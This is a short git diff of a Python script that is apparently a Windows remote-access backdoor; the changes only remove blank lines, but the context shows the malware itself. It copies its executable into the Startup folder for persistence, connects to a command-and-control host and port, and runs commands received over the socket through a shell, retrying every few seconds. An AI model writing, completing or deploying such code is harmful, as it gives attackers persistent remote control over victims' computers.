@@ -13,7 +13,6 @@ def autorun():
     
     os.system("copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"".format(exe_file))
 
-
 def conn(CCIP, CCPORT):
     try:
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
@@ -22,9 +21,6 @@ def conn(CCIP, CCPORT):
     except Exception as error:
         print(error)
        
-
-
-
 def cmd(client, data):
     try:
         proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE) #me da acesso a subprocessos do windows
@@ -52,5 +48,3 @@ if __name__ == "__main__":
             cli(client)
         else:
             time.sleep(3)
-
-
